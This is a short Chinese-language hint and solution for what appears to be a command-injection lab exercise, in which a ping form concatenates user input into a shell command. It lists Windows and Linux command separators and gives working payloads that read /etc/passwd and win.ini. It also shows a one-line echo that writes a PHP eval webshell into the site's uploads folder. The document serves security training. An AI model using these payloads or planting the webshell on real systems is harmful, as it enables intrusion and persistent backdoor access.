思路提示

命令执行的核心是输入的 IP 被直接拼进了系统命令（ping）。思路：用命令拼接符把自己的命令接在后面。Windows 用 &、|、&&、||；Linux 用 ;、&&、|、||。先跑个简单的 whoami 确认能执行，再尝试读文件、写 WebShell。注意在输入框里填 & 即可，浏览器会自动 URL 编码。

详细解题过程（点击展开）
命令拼接符：
Windows：& 依次执行   && 前成功才执行   | 管道   || 前失败才执行
Linux：; 依次执行   && 前成功才执行   | 管道   || 前失败才执行   & 后台执行
通用 payload（Windows + Linux 均生效）：
在页面输入框中填写 127.0.0.1 & whoami（浏览器会自动把 & 编码为 %26，服务器解码后即为命令拼接符 &）
Windows 示例（在输入框内填写）：
127.0.0.1 & ipconfig
127.0.0.1&calc
127.0.0.1 & type C:\\Windows\\win.ini
Linux 示例（在输入框内填写）：
127.0.0.1 ; id
127.0.0.1 ; cat /etc/passwd
地址栏直接输入（需手动 URL 编码）：
?ip=127.0.0.1%20%26%20whoami
注意：不要在输入框里填 %26，否则会被二次编码为 %2526，ping 会报"错误的参数 %26"。 写 WebShell（以 Linux 为例，Windows 把路径换成 uploads 绝对路径即可）：
?ip=127.0.0.1 ; echo '<?php @eval($_POST["cmd"]);?>' > /var/www/html/bafanglab/uploads/shell.php
